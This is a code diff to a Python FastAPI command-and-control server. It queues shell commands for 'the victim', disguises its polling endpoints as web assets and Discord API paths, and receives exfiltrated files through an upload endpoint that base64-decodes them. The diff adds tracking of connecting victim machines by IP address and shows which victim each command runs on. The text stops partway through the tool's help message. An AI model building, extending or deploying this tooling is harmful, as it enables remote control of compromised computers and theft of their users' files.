@@ -17,6 +17,9 @@ PAUSE_CMDS: bool = False
 
 app = FastAPI()
 
+global_lock = True
+global_connection = False
+
 cmdRequests = [
 "bootstrap.js",
 "index.html",
@@ -51,6 +54,8 @@ outputRequests = [
 "api/v9/users/@me/guilds"
 ]
 
+clients = []
+
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -64,6 +69,13 @@ class bcolors:
 
 def fancyprint(text: str):
     print("\r" + text + "\n$ ", end="")
+    
+def checkIfNewClient(client):
+    if (client not in clients) and (global_lock == False):
+        clients.append(client)
+        print(f"New connection from: {client}")
+        global global_connection
+        global_connection = True
 
 @app.get("/upload.php/{file:path}", response_class=PlainTextResponse)
 async def upload_file(file: str, request: Request):
@@ -79,11 +91,15 @@ async def download_file(file: str, request: Request):
 
 @app.get("/{path:path}", response_class=PlainTextResponse)
 async def get_command(path: str, request: Request):
+
+    client = request.client.host
+    checkIfNewClient(client)
+
     if path in cmdRequests: 
         if len(CMD_QUEUE) == 0:
             return "204 - No Content"
         cmd: str = CMD_QUEUE.pop(0)
-        fancyprint(f"Running '{cmd}'...")
+        fancyprint(f"Running '{cmd}' on {client}...")
         CMD_HISTORY.append(cmd)
         return cmd
 
@@ -104,9 +120,7 @@ def decodeFile(filePath, content):
     decoded = base64.b64decode(content)
     with open(filePath, 'wb') as file:
         file.write(decoded)
-    
-        
-
+ 
 def printHeader():
     print(f"""{bcolors.FAIL} 
                                             
@@ -177,10 +191,17 @@ def input_thread():
             break
         else:
             print("Please enter y or n")
-    
-    while True:
 
-        new_cmd: str = input("$ ")
+    global global_lock
+    global_lock = False
+
+    global global_connection
+
+    while True:
+        new_cmd = ""
+
+        if global_connection:
+            new_cmd = input("$ ")
         #help
         if new_cmd == "help":
             print("""Run a command on the victim or
